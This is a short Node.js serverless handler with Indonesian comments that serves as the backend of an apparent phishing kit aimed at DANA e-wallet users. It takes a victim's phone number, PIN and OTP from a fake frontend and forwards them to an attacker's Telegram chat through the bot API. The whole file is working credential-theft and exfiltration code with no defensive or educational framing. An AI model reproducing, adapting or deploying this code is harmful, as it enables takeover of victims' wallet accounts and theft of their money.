const axios = require('axios');

exports.handler = async (event) => {
  try {
    // 1. Terima data dari frontend
    const { type, phone, pin, otp } = JSON.parse(event.body);

    // 2. Validasi input
    if (!phone || phone.length < 10) {
      return { statusCode: 400, body: JSON.stringify({ error: "Nomor HP minimal 10 digit" }) };
    }

    // 3. Format pesan untuk Telegram
    const message = `
🟢 *DATA DANA* 🟢
📱 No HP: ${phone}
${pin ? `🔒 PIN: ${pin}` : ''}
${otp ? `🔑 OTP: ${otp}` : ''}
🕒 ${new Date().toLocaleString()}
    `;

    // 4. Kirim ke Telegram
    await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });

    return { statusCode: 200, body: JSON.stringify({ success: true }) };
  } catch (error) {
    return { statusCode: 500, body: JSON.stringify({ error: "Server error" }) };
  }
};
